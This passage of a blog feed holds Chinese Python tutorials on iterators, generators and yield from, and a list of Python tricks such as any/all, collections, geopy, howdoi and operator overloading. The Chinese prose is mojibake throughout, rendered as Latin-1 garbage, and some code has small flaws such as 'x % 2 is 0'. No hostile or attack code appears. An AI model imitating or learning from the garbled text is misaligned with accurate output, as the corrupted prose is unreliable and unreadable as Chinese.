æ–¹æ³•ï¼Œé‚£ä¹ˆå¯¹è±¡å°±æ˜¯å¯è¿­ä»£çš„ã€‚åºåˆ—éƒ½å¯ä»¥è¿­ä»£ï¼›å®ç°__getitem__ æ–¹æ³•ï¼Œè€Œä¸”å…¶å‚æ•°æ˜¯ä»é›¶å¼€å§‹çš„ç´¢å¼•ï¼Œè¿™ç§å¯¹è±¡ä¹Ÿå¯ä»¥è¿­ä»£ã€‚æˆ‘ä»¬è¦æ˜ç¡®å¯è¿­ä»£çš„å¯¹è±¡å’Œè¿­ä»£å™¨ä¹‹é—´çš„å…³ç³»ï¼šPython ä»å¯è¿­ä»£çš„å¯¹è±¡ä¸­è·å–è¿­ä»£å™¨ã€‚ ä¸‹é¢ç»™å‡ºä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œä½¿ç”¨whileå¾ªç¯æ¨¡æ‹Ÿforå¾ªç¯ä¸­çš„è¿­ä»£å™¨ï¼š 1234567891011121314# for å®ç°s = 'ABC'for char in s: print(char)# while å®ç°s = 'ABC'it = iter(s) while True: try: print(next(it)) except StopIteration: del it break æ ‡å‡†çš„è¿­ä»£å™¨æ¥å£æœ‰ä¸¤ä¸ªæ–¹æ³•ã€‚ __next__ è¿”å›ä¸‹ä¸€ä¸ªå¯ç”¨çš„å…ƒç´ ï¼Œå¦‚æœæ²¡æœ‰å…ƒç´ äº†ï¼ŒæŠ›å‡º StopIteration å¼‚å¸¸ã€‚ __iter__ è¿”å› selfï¼Œä»¥ä¾¿åœ¨åº”è¯¥ä½¿ç”¨å¯è¿­ä»£å¯¹è±¡çš„åœ°æ–¹ä½¿ç”¨è¿­ä»£å™¨ï¼Œä¾‹å¦‚åœ¨ for å¾ªç¯ä¸­ã€‚ è¿™ä¸ªæ¥å£åœ¨ collections.abc.Iterator æŠ½è±¡åŸºç±»ä¸­åˆ¶å®šã€‚è¿™ä¸ªç±»å®šä¹‰äº† __next__ æŠ½è±¡æ–¹æ³•ï¼Œè€Œä¸”ç»§æ‰¿è‡ª Iterable ç±»ï¼›__iter__ æŠ½è±¡æ–¹æ³•åˆ™åœ¨ Iterable ç±»ä¸­å®šä¹‰ã€‚ å› ä¸ºè¿­ä»£å™¨åªæœ‰__next__ å’Œ__iter__æ–¹æ³•ï¼Œæ‰€ä»¥è¿­ä»£å™¨æ²¡åŠæ³•æ£€æŸ¥é—æ¼çš„å…ƒç´ å’Œâ€˜è¿˜åŸâ€™è¿­ä»£å™¨ï¼Œ å¦‚æœæƒ³å†æ¬¡è¿­ä»£ï¼Œ è¿˜æ˜¯éœ€è¦ä¼ å…¥è¢«è¿­ä»£çš„å¯¹è±¡ã€‚ç”±äºIterator.__init__æ˜¯è¿”å›å®ä¾‹æœ¬èº«ï¼Œä¼ å…¥è¿­ä»£å™¨æ— æ³•è¿˜åŸå·²ç»è¿­ä»£è¿‡çš„å…ƒç´ ã€‚ 14.3 å…¸å‹çš„è¿­ä»£å™¨è¿™ä¸€èŠ‚ä¼šå°†è¿­ä»£å™¨å’Œå¯è¿­ä»£å¯¹è±¡åˆ†ç¦»å¼€æ¥ï¼Œè®©æˆ‘ä»¬æ›´åŠ æ¸…æ¥šè¿­ä»£å™¨å’Œå¯è¿­ä»£å¯¹è±¡çš„å…³ç³» 123456789101112131415161718192021222324252627import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): return SentenceIterator(self.words)class SentenceIterator: def __init__(self, words): self.words = words self.index = 0 def __next__(self): try: word = self.words[self.index] except IndexError: raise StopIteration() self.index += 1 return word def __iter__(self): return self å¦‚æœåœ¨Sentenceä¸­å®ç°__next__æ–¹æ³•ï¼Œ å¯ä»¥è®©SentenceåŒæ—¶æˆä¸ºå¯è¿­ä»£å¯¹è±¡å’Œè¿­ä»£å™¨ã€‚ä½†æ˜¯è¿™æ˜¯ä¸€ä¸ªç›¸å½“ç³Ÿç³•çš„è®¾è®¡ã€‚å¯è¿­ä»£çš„å¯¹è±¡ä¸€å®šä¸èƒ½æ˜¯è‡ªèº«çš„è¿­ä»£å™¨ è¿­ä»£å™¨æ¨¡å¼ä¸­æŒ‡æ˜ï¼Œ è¿­ä»£å™¨åº”è¯¥æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š è®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡çš„å†…å®¹è€Œæ— éœ€æš´éœ²å®ƒçš„å†…éƒ¨è¡¨ç¤º æ”¯æŒå¯¹èšåˆå¯¹è±¡çš„å¤šç§éå†(æ¯æ¬¡è°ƒç”¨iter()éƒ½æ–°å»ºä¸€ä¸ªç‹¬ç«‹çš„è¿­ä»£å™¨) ä¸ºéå†ä¸åŒçš„èšåˆç»“æ„æä¾›ç»Ÿä¸€çš„æ¥å£ 14.4 ç”Ÿæˆå™¨å‡½æ•°Pythonä¸­å®ç°ä¸Šä¸€èŠ‚ç›¸åŒåŠŸèƒ½çš„æ–¹å¼æ˜¯ä½¿ç”¨ç”Ÿæˆå™¨å‡½æ•°ä»£æ›¿é¢å¤–å®ç°çš„è¿­ä»£å™¨ã€‚ 12345678910111213import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text self.words = RE_WORD.findall(text) def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): for word in self.words: yield word return ç›¸æ¯”èµ·ä¸Šä¸€èŠ‚çš„å®ç°ç®€å•è®¸å¤šã€‚ åªè¦ Python å‡½æ•°çš„å®šä¹‰ä½“ä¸­æœ‰ yield å…³é”®å­—ï¼Œè¯¥å‡½æ•°å°±æ˜¯ç”Ÿæˆå™¨å‡½æ•°ã€‚è°ƒç”¨ç”Ÿæˆå™¨å‡½æ•°æ—¶ï¼Œä¼šè¿”å›ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç”Ÿæˆå™¨å‡½æ•°æ˜¯ç”Ÿæˆå™¨å·¥å‚ã€‚ 14.5 ç”Ÿæˆå™¨çš„æƒ°æ€§å®ç°re.finditeræ˜¯re.findallçš„æƒ°æ€§ç‰ˆæœ¬ï¼Œ è¿”å›çš„ä¸æ˜¯ä¸€ä¸ªåˆ—è¡¨è€Œæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œè¿™æ ·ä¹Ÿèƒ½èŠ‚çœå¤§é‡å†…å­˜ã€‚ 1234567891011import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): for match in RE_WORD.finditer(self.text): yield match.group() ä½¿ç”¨finditerä½¿å¾—Sentenceçš„å…ƒç´ å˜å¾—å¯ä»¥æƒ°æ€§è·å¾—äº†ã€‚ 14.6 ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¸‹é¢ä½¿ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼æ„å»ºç”Ÿæˆå™¨, ä¼šä½¿ä»£ç æ›´åŠ ç®€æ´12345678910import reimport reprlibRE_WORD = re.compile('\w+')class Sentence: def __init__(self, text): self.text = text def __repr__(self): return 'Sentence(%s)' % reprlib.repr(self.text) def __iter__(self): return (match.group() for match in RE_WORD.finditer(self.text)) 14.7 yeild from æ³¨: yeild from æ˜¯Python3.3ä¸­æ–°å‡ºç°çš„è¯­æ³• å¦‚æœç”Ÿæˆå™¨å‡½æ•°éœ€è¦äº§å‡ºå¦ä¸€ä¸ªç”Ÿæˆå™¨ç”Ÿæˆçš„å€¼ï¼Œä¼ ç»Ÿçš„è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨åµŒå¥—çš„ for å¾ªç¯ã€‚ä¾‹å¦‚ï¼š 123456789&gt;&gt;&gt; def chain(*iterables):... for it in iterables:... for i in it:... yield i...&gt;&gt;&gt; s = 'ABC'&gt;&gt;&gt; t = tuple(range(3))&gt;&gt;&gt; list(chain(s, t))['A', 'B', 'C', 0, 1, 2] è¿™ä¸ªchainç”Ÿæˆå™¨å‡½æ•°å§æ“ä½œä¾æ¬¡äº¤ç»™å„ä¸ªå¯è¿­ä»£å¯¹è±¡å¤„ç†ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•ç®€åŒ–ï¼š 123456&gt;&gt;&gt; def chain(*iterables):... for i in iterables:... yield from i...&gt;&gt;&gt; list(chain(s, t))['A', 'B', 'C', 0, 1, 2] å¯ä»¥çœ‹å‡ºï¼Œyield from i å®Œå…¨ä»£æ›¿äº†å†…å±‚çš„ for å¾ªç¯ï¼Œ ä½¿å¾—ä»£ç ç®€åŒ–å¾ˆå¤šã€‚ 14.8 æ·±å…¥åˆ†æiter()å‡½æ•°åœ¨ Python ä¸­è¿­ä»£å¯¹è±¡ x æ—¶ä¼šè°ƒç”¨ iter(x), è¿™æ˜¯ä¸Šæ–‡ä¸­æˆ‘ä»¬åå¤æåˆ°çš„, è¿™ä¹Ÿæ˜¯iter()æœ€å¸¸è§çš„ç”¨æ³•ã€‚ iter å‡½æ•°è¿˜æœ‰ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„ç”¨æ³•ï¼šä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œä½¿ç”¨å¸¸è§„çš„å‡½æ•°æˆ–ä»»ä½•å¯è°ƒç”¨çš„å¯¹è±¡åˆ›å»ºè¿­ä»£å™¨ã€‚è¿™æ ·ä½¿ç”¨æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡ï¼Œç”¨äºä¸æ–­è°ƒç”¨ï¼ˆæ²¡æœ‰å‚æ•°ï¼‰ï¼Œäº§å‡ºå„ä¸ªå€¼ï¼›ç¬¬äºŒä¸ªå€¼æ˜¯å“¨ç¬¦ï¼Œè¿™æ˜¯ä¸ªæ ‡è®°å€¼ï¼Œå½“å¯è°ƒç”¨çš„å¯¹è±¡è¿”å›è¿™ä¸ªå€¼æ—¶ï¼Œè§¦å‘è¿­ä»£å™¨æŠ›å‡º StopIteration å¼‚å¸¸ï¼Œè€Œä¸äº§å‡ºå“¨ç¬¦ã€‚ ä¾‹å­ï¼š12345678# æ·éª°å­ç›´åˆ°æ·å‡º1ç‚¹from random import randintdef d6(): return randint(1, 6)d6_iter = iter(d6, 1)for roll in d6_iter: print(roll) 14.9 ç”Ÿæˆå™¨å½“æˆåç¨‹ Python 2.5 å®ç°äº†â€œPEP 342 â€” Coroutines via Enhanced Generatorsâ€ï¼ˆhttps://www.python.org/dev/peps/pep-0342/ ï¼‰ã€‚è¿™ä¸ªææ¡ˆä¸ºç”Ÿæˆå™¨å¯¹è±¡æ·»åŠ äº†é¢å¤–çš„æ–¹æ³•å’ŒåŠŸèƒ½ï¼Œå…¶ä¸­æœ€å€¼å¾—å…³æ³¨çš„æ˜¯ .send() æ–¹æ³•ï¼Œ è¿™ä¸ªå‡½æ•°è®©ç”Ÿæˆå™¨å˜èº«ä¸ºåç¨‹ã€‚ ä¸ .__next__() æ–¹æ³•ä¸€æ ·ï¼Œ.send() æ–¹æ³•è‡´ä½¿ç”Ÿæˆå™¨å‰è¿›åˆ°ä¸‹ä¸€ä¸ª yield è¯­å¥ã€‚ä¸è¿‡ï¼Œ.send() æ–¹æ³•è¿˜å…è®¸ä½¿ç”¨ç”Ÿæˆå™¨çš„å®¢æˆ·æŠŠæ•°æ®å‘ç»™è‡ªå·±ï¼Œå³ä¸ç®¡ä¼ ç»™ .send() æ–¹æ³•ä»€ä¹ˆå‚æ•°ï¼Œé‚£ä¸ªå‚æ•°éƒ½ä¼šæˆä¸ºç”Ÿæˆå™¨å‡½æ•°å®šä¹‰ä½“ä¸­å¯¹åº”çš„ yield è¡¨è¾¾å¼çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ.send() æ–¹æ³•å…è®¸åœ¨å®¢æˆ·ä»£ç å’Œç”Ÿæˆå™¨ä¹‹é—´åŒå‘äº¤æ¢æ•°æ®ã€‚è€Œ .__next__() æ–¹æ³•åªå…è®¸å®¢æˆ·ä»ç”Ÿæˆå™¨ä¸­è·å–æ•°æ®ã€‚ ç”Ÿæˆå™¨ç”¨äºç”Ÿæˆä¾›è¿­ä»£çš„æ•°æ® åç¨‹æ˜¯æ•°æ®çš„æ¶ˆè´¹è€… ä¸ºäº†é¿å…è„‘è¢‹ç‚¸è£‚ï¼Œä¸èƒ½æŠŠè¿™ä¸¤ä¸ªæ¦‚å¿µæ··ä¸ºä¸€è°ˆ åç¨‹ä¸è¿­ä»£æ— å…³ æ³¨æ„ï¼Œè™½ç„¶åœ¨åç¨‹ä¸­ä¼šä½¿ç”¨ yield äº§å‡ºå€¼ï¼Œä½†è¿™ä¸è¿­ä»£æ— å…³ â€”â€”David Beazley â€œA Curious Course on Coroutines and Concurrencyâ€ åŸºäºè¿™å‡ ç‚¹ï¼Œ æœ¬ç« ä¸è®¨è®ºåç¨‹ 14.9 å°ç»“Python è¯­è¨€å¯¹è¿­ä»£çš„æ”¯æŒéå¸¸æ·±å…¥, Python å·²ç»èåˆï¼ˆgrokï¼‰äº†è¿­ä»£å™¨ã€‚Python ä»è¯­ä¹‰ä¸Šé›†æˆè¿­ä»£å™¨æ¨¡å¼æ˜¯ä¸ªå¾ˆå¥½çš„ä¾‹è¯ï¼Œè¯´æ˜è®¾è®¡æ¨¡å¼åœ¨å„ç§ç¼–ç¨‹è¯­è¨€ä¸­ä½¿ç”¨çš„æ–¹å¼å¹¶ä¸ç›¸åŒã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Iterable</tag>
        <tag>Iterator</tag>
        <tag>Generator</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå¸¸ç”¨çš„ä¸€äº›å°æŠ€å·§(è¯­æ³•ç³– etc.)]]></title>
    <url>%2F2018%2F09%2F17%2Fsome_python_tricks%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡åˆ†äº«ä¸€äº›ä½¿ç”¨ Python çš„æŠ€å·§ï¼Œé¡ºåºæŒ‰ç…§ A-Z æ’åˆ—ã€‚ all or anyPython éå¸¸å—æ¬¢è¿çš„åŸå› ä¹‹ä¸€æ˜¯å…¶å¯è¯»æ€§å’Œè¡¨è¾¾æ€§ã€‚ äººä»¬è¿˜ç»å¸¸æŠŠ Python ç¬‘ç§°ä¸ºã€Œå¯æ‰§è¡Œä¼ªç ï¼ˆexecutable pseudocodeï¼‰ã€ã€‚ä½†æ˜¯ï¼Œå½“ä½ å¯ä»¥ç¼–å†™è¿™æ ·çš„ä»£ç æ—¶ï¼Œå¾ˆéš¾å»åé©³è¿™ç§è¨€è®ºï¼š 12345678910111213x = [True, True, False]if any(x): print("At least one True")if all(x): print("Not one False")if any(x) and not all(x): print("At least one True and one False") bashplotlibæƒ³åœ¨æ§åˆ¶å°ä¸­ç»˜å›¾å—ï¼Ÿ 1$ pip install bashplotlib ä½¿ç”¨ä¸Šé¢çš„è¡Œï¼Œå³å¯åœ¨æ§åˆ¶å°ä¸­ç»˜å›¾ã€‚ collectionsPython æœ‰ä¸€äº›å¾ˆæ£’çš„é»˜è®¤æ•°æ®ç±»å‹ï¼Œä½†æœ‰æ—¶å€™å®ƒä»¬å¯èƒ½ä¸ä¼šå°½å¦‚ä½ æ„ã€‚ ä¸è¿‡ï¼ŒPython æ ‡å‡†åº“æä¾›äº† collections æ¨¡å—ã€‚è¿™ä¸ªæ–¹ä¾¿çš„é™„åŠ ç»„ä»¶å¯ä»¥ä¸ºä½ æä¾›æ›´å¤šæ•°æ®ç±»å‹ã€‚ collections æ¨¡å—ï¼šhttps://docs.python.org/3/library/collections.html 123456789from collections import OrderedDict, Counter# Remembers the order the keys are added!x = OrderedDict(a=1, b=2, c=3)# Counts the frequency of each charactery = Counter("Hello World!") dirä½ æ˜¯å¦æƒ³è¿‡å¦‚ä½•æŸ¥çœ‹ Python å¯¹è±¡å†…éƒ¨åŠå…¶å…·æœ‰å“ªäº›å±æ€§ï¼Ÿ è¾“å…¥ä»¥ä¸‹å‘½ä»¤è¡Œï¼š12345&gt;&gt;&gt; dir()&gt;&gt;&gt; dir("Hello World")&gt;&gt;&gt; dir(dir) å½“ä»¥äº¤äº’æ–¹å¼è¿è¡Œ Python æ—¶ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥åŠ¨æ€åœ°æ¢ç´¢ä½ æ­£åœ¨ä½¿ç”¨çš„å¯¹è±¡å’Œæ¨¡å—ã€‚ æƒ³è¦äº†è§£æ›´å¤šï¼Œç‚¹è¿™é‡Œ https://docs.python.org/3/library/functions.html#dir emojiæ˜¯çš„ï¼ŒçœŸçš„æœ‰ã€‚è¯·ç‚¹å‡»è¿™é‡Œ https://pypi.org/project/emoji/ 1$ pip install emoji åˆ«ä»¥ä¸ºæˆ‘ä¸çŸ¥é“ä½ ä¼šå·å·è¯•å®ƒâ†’â†’12345from emoji import emojizeprint(emojize(":thumbs_up:"))ğŸ‘ from __future__ importPython æµè¡Œçš„ä¸€ä¸ªç»“æœæ˜¯ï¼Œæ€»æœ‰æ–°ç‰ˆæœ¬æ­£åœ¨å¼€å‘ä¸­ã€‚æ–°ç‰ˆæœ¬æ„å‘³ç€æ–°åŠŸèƒ½â€”â€”é™¤éä½ çš„ç‰ˆæœ¬å·²ç»è¿‡æ—¶ã€‚ ä¸è¿‡ï¼Œåˆ«æ‹…å¿ƒã€‚__future__æ¨¡å—å…è®¸ç”¨æˆ·å¯¼å…¥æ–°ç‰ˆ Python çš„åŠŸèƒ½ã€‚è¿™ç®€ç›´å°±åƒæ—¶é—´æ—…è¡Œï¼Œæˆ–è€…é­”æ³•ä»€ä¹ˆçš„ã€‚ __future__æ¨¡å—ï¼šhttps://docs.python.org/2/library/\*future\*.html 123from \_\_future\_\_ import print_functionprint("Hello World!") geopyåœ°ç†ï¼ˆGeographyï¼‰å¯¹äºç¨‹åºå‘˜æ¥è¯´å¯èƒ½æ˜¯ä¸€ä¸ªå…·æœ‰æŒ‘æˆ˜æ€§çš„é¢†åŸŸã€‚ä½†æ˜¯ geopy æ¨¡å—è®©å®ƒå˜å¾—å¼‚å¸¸ç®€å•ã€‚ geopy æ¨¡å—ï¼šhttps://geopy.readthedocs.io/en/latest/1$ pip install geopy å®ƒé€šè¿‡æŠ½å–ä¸€ç³»åˆ—ä¸åŒåœ°ç†ç¼–ç æœåŠ¡çš„ API æ¥å·¥ä½œï¼Œä½¿ç”¨æˆ·è·å–ä¸€ä¸ªåœ°æ–¹çš„å®Œæ•´è¡—é“åœ°å€ã€çº¬åº¦ã€ç»åº¦ï¼Œç”šè‡³æµ·æ‹”é«˜åº¦ã€‚ å¦å¤–ä¸€ä¸ªæœ‰ç”¨çš„åŠŸèƒ½æ˜¯è·ç¦»ï¼šå®ƒå¯ä»¥ç”¨ä½ å–œæ¬¢çš„åº¦é‡å•ä½è®¡ç®—å‡ºä¸¤ä¸ªä½ç½®ä¹‹é—´çš„è·ç¦»ã€‚ 123456789from geopy import GoogleV3place = "221b Baker Street, London"location = GoogleV3().geocode(place)print(location.address)print(location.location) howdoié™·å…¥ç¼–ç é—®é¢˜ï¼Œå´ä¸è®°å¾—ä»¥å‰è§è¿‡çš„è§£å†³æ–¹æ¡ˆï¼Ÿéœ€è¦æ£€æŸ¥ StackOverflowï¼Œä½†ä¸æƒ³ç¦»å¼€ç»ˆç«¯ï¼Ÿ é‚£ä¹ˆä½ éœ€è¦è¿™ä¸ªæœ‰ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼šhttps://github.com/gleitz/howdoiã€‚ 1$ pip install howdoi æ— è®ºä½ æœ‰ä»€ä¹ˆé—®é¢˜éƒ½å¯ä»¥é—®å®ƒï¼Œå®ƒä¼šå°½åŠ›å›ç­”ã€‚12345$ howdoi vertical align css$ howdoi for loop in java$ howdoi undo commits in git ä½†æ˜¯è¯·æ³¨æ„â€”â€”å®ƒä¼šä» StackOverflow çš„æœ€é«˜ç¥¨ç­”æ¡ˆä¸­æŠ“å–ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒæä¾›çš„ä¿¡æ¯å¹¶éæ€»æ˜¯æœ‰ç”¨â€¦â€¦1$ howdoi exit vim inspectPython çš„ inspect æ¨¡å—éå¸¸æœ‰åŠ©äºç†è§£é—®é¢˜èƒŒåçš„è¯¦æƒ…ã€‚ä½ ç”šè‡³å¯ä»¥åœ¨ inspect æ¨¡å—ä¸Šè°ƒç”¨å…¶æ–¹æ³•ï¼ inspect æ¨¡å—ï¼šhttps://docs.python.org/3/library/inspect.html ä¸‹é¢çš„ä»£ç ç¤ºä¾‹ä½¿ç”¨ inspect.getsource() æ‰“å°è‡ªå·±çš„æºä»£ç ã€‚å®ƒè¿˜ä½¿ç”¨ inspect.getmodule() æ‰“å°å®šä¹‰å®ƒçš„æ¨¡å—ã€‚ æœ€åä¸€è¡Œä»£ç æ‰“å°å‡ºè‡ªå·±çš„è¡Œå·ã€‚1234567import inspectprint(inspect.getsource(inspect.getsource))print(inspect.getmodule(inspect.getmodule))print(inspect.currentframe().f_lineno) å½“ç„¶ï¼Œé™¤äº†è¿™äº›çç¢çš„ç”¨é€”ä¹‹å¤–ï¼Œinspect æ¨¡å—è¿˜èƒ½å¸®åŠ©ä½ ç†è§£ä»£ç æ­£åœ¨åšçš„äº‹ã€‚ä½ è¿˜å¯ä»¥ç”¨å®ƒç¼–å†™è‡ªæ–‡æ¡£åŒ–ä»£ç ã€‚ JediJedi åº“æ˜¯ä¸€ä¸ªè‡ªåŠ¨å®Œæˆå’Œä»£ç åˆ†æçš„åº“ã€‚å®ƒä½¿ä»£ç ç¼–å†™å˜å¾—æ›´å¿«ã€æ•ˆæœæ›´é«˜ã€‚ é™¤éä½ æ­£åœ¨å¼€å‘è‡ªå·±çš„ IDEï¼Œå¦åˆ™ä½ è‚¯å®šä¼šå¯¹ä½¿ç”¨ Jedi åº“ä½œä¸ºç¼–è¾‘æ’ä»¶å¾ˆæ„Ÿå…´è¶£ã€‚ Jediï¼šhttps://jedi.readthedocs.io/en/latest/docs/usage.html ä½ å¯èƒ½å·²ç»åœ¨ä½¿ç”¨ Jedi äº†ã€‚IPython é¡¹ç›®å°±ä½¿ç”¨ Jedi å®ç°ä»£ç è‡ªåŠ¨å®ŒæˆåŠŸèƒ½ã€‚ **kwargså­¦ä¹ ä»»ä½•è¯­è¨€æ—¶éƒ½ä¼šé‡åˆ°å¾ˆå¤šé‡Œç¨‹ç¢‘ã€‚å¯¹äº Python æ¥è¯´ï¼Œç†è§£ç¥ç§˜çš„**kwargs è¯­æ³•å¯èƒ½ç®—æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚ è¯å…¸å¯¹è±¡å‰é¢çš„åŒæ˜Ÿå·å¯ä»¥è®©ä½ æŠŠè¯¥è¯å…¸çš„å†…å®¹ä½œä¸ºå‘½åå‚æ•°è¾“å…¥åˆ°å‡½æ•°ä¸­ã€‚ è¯å…¸çš„ç§˜é’¥æ˜¯å‚æ•°åï¼Œå€¼æ˜¯ä¼ é€’ç»™å‡½æ•°çš„å€¼ã€‚ä½ ç”šè‡³ä¸éœ€è¦ç§°å®ƒä¸º kwargsï¼ 12345678910111213dictionary = &#123;"a": 1, "b": 2&#125;def someFunction(a, b): print(a + b) return# these do the same thing:someFunction(**dictionary)someFunction(a=1, b=2) å½“ä½ æƒ³ç¼–å†™èƒ½å¤Ÿå¤„ç†äº‹å…ˆæœªå®šä¹‰çš„å‘½åå‚æ•°çš„å‡½æ•°æ—¶ï¼Œè¿™ä¸ªå¾ˆæœ‰ç”¨ã€‚ åˆ—è¡¨æ¨å¯¼å¼ï¼ˆList comprehensionsï¼‰æˆ‘æœ€å–œæ¬¢ Python ç¼–ç¨‹çš„åŸå› ä¹‹ä¸€æ˜¯å®ƒçš„åˆ—è¡¨æ¨å¯¼å¼ https://docs.python.org/3/tutorial/datastructures.html#list-comprehensions è¿™äº›è¡¨è¾¾å¼ä½¿å¾—ç¼–å†™å¹²å‡€æ˜“è¯»çš„ä»£ç å˜å¾—å¾ˆå®¹æ˜“ï¼Œé‚£äº›ä»£ç è¯»èµ·æ¥å‡ ä¹åƒè‡ªç„¶è¯­è¨€ä¸€æ ·ã€‚ å…³äºå®ƒä»¬çš„æ›´å¤šä½¿ç”¨ä¿¡æ¯è¯·æŸ¥çœ‹ï¼šhttps://www.learnpython.org/en/List_Comprehensions 123456789101112131415numbers = [1,2,3,4,5,6,7]evens = [x for x in numbers if x % 2 is 0]odds = [y for y in numbers if y not in evens]cities = ['London', 'Dublin', 'Oslo']def visit(city): print("Welcome to "+city)for city in cities: visit(city) mapPython é€šè¿‡è®¸å¤šå†…ç½®åŠŸèƒ½æ”¯æŒå‡½æ•°å¼ç¼–ç¨‹ã€‚map() å‡½æ•°æ˜¯æœ€æœ‰ç”¨çš„å‡½æ•°ä¹‹ä¸€â€”â€”ç‰¹åˆ«æ˜¯å½“å®ƒä¸ lambda å‡½æ•°ç»“åˆä½¿ç”¨æ—¶ã€‚ lambda å‡½æ•°ï¼šhttps://docs.python.org/3/tutorial/controlflow.html#lambda-expressions 1234567x = [1, 2, 3]y = map(lambda x : x + 1 , x)# prints out [2,3,4]print(list(y)) åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œmap() å°†ä¸€ä¸ªç®€å•çš„ lambda å‡½æ•°åº”ç”¨äº x ä¸­çš„æ¯ä¸ªå…ƒç´ ã€‚å®ƒè¿”å›ä¸€ä¸ª map å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯ä»¥è¢«è½¬æ¢æˆå¯è¿­ä»£çš„å¯¹è±¡ï¼Œå¦‚åˆ—è¡¨æˆ–å…ƒç»„ã€‚ newspaper3kå¦‚æœä½ ä¹‹å‰æ²¡æœ‰è§è¿‡å®ƒï¼Œé‚£ä¹ˆæˆ‘å»ºè®®ä½ å…ˆæŸ¥çœ‹ https://pypi.org/project/newspaper3k/ã€‚ å®ƒå¯ä»¥å¸®åŠ©ä½ ä»å¤§é‡é¡¶çº§å›½é™…å‡ºç‰ˆç‰©ä¸­æ£€ç´¢åˆ°æ–°é—»æ–‡ç« å’Œç›¸å…³å…ƒæ•°æ®ã€‚ä½ å¯ä»¥æ£€ç´¢å›¾åƒã€æ–‡æœ¬å’Œä½œè€…åã€‚ å®ƒè¿˜æœ‰ä¸€äº›å†…ç½®çš„ NLP åŠŸèƒ½ã€‚ åœ°å€ï¼šhttps://newspaper.readthedocs.io/en/latest/user_guide/quickstart.html#performing-nlp-on-an-article å¦‚æœä½ æƒ³åœ¨ä¸‹ä¸€ä¸ªé¡¹ç›®ä¸­ä½¿ç”¨ BeautifulSoup æˆ–å…¶å®ƒ DIY ç½‘é¡µæŠ“å–åº“ï¼Œé‚£ä¹ˆä¸å¦‚ä½¿ç”¨$ pip install newspaper3kï¼Œæ—¢çœæ—¶åˆçœäº‹ï¼Œä½•ä¹è€Œä¸ä¸ºå‘¢ï¼Ÿ è¿ç®—ç¬¦é‡è½½ï¼ˆOperator overloadingï¼‰Python æ”¯æŒè¿ç®—ç¬¦é‡è½½ã€‚ å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç®€å•çš„æ¦‚å¿µã€‚ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ä¸ºä»€ä¹ˆ Python å…è®¸ç”¨æˆ·ä½¿ç”¨ + è¿ç®—ç¬¦æ¥å°†æ•°å­—ç›¸åŠ ï¼Œå¹¶çº§è”å­—ç¬¦ä¸²ï¼Ÿè¿™å°±æ˜¯è¿ç®—ç¬¦é‡è½½åœ¨å‘æŒ¥ä½œç”¨ã€‚ ä½ å¯ä»¥ä½¿ç”¨ Python çš„æ ‡å‡†è¿ç®—ç¬¦å·æ¥å®šä¹‰å¯¹è±¡ï¼Œè¿™æ ·ä½ å¯ä»¥åœ¨ä¸è¿™äº›å¯¹è±¡ç›¸å…³çš„è¯­å¢ƒä¸­ä½¿ç”¨å®ƒä»¬ã€‚1234567891011121314151617181920212223242526272829class Thing: def __init__(self, value): self.__value = value def __gt__(self, other): return self.__value &gt; other.__value def __lt__(self, other): return self.__value &lt; other.__valuesomething = Thing(100)nothing = Thing(0)# Truesomething &gt; nothing# Falsesomething &lt; nothing# Errorsomething + nothing pprintPython çš„é»˜è®¤ print å‡½æ•°å°±å¯ä»¥å®ç°æ‰“å°åŠŸèƒ½ã€‚ä½†å¦‚æœå°è¯•æ‰“å°è¾ƒå¤§çš„åµŒå¥—å¯¹è±¡ï¼Œå°±ä¼šå‘ç°æ‰“å°ç»“æœå¾ˆä¸‘ã€‚ è¿™æ—¶ Python æ ‡å‡†åº“çš„ pretty printer æ¨¡å—å°±å¯ä»¥å‘æŒ¥ä½œç”¨äº†ã€‚è¯¥æ¨¡å—å¯ä»¥å°†å¤æ‚çš„ç»“æ„åŒ–å¯¹è±¡ä»¥ä¸€ç§æ˜“è¯»çš„æ ¼å¼æ‰“å°å‡ºæ¥ã€‚ pretty printer æ¨¡å—ï¼šhttps://docs.python.org/3/library/pprint.html Python å¼€å‘è€…çš„å¿…å¤‡æŠ€èƒ½ä¹‹ä¸€å°±æ˜¯å¤„ç†å¤æ‚çš„æ•°æ®ç»“æ„ã€‚1234567891011import requestsimport pprinturl = 'https://randomuser.me/api/?results=1'users = 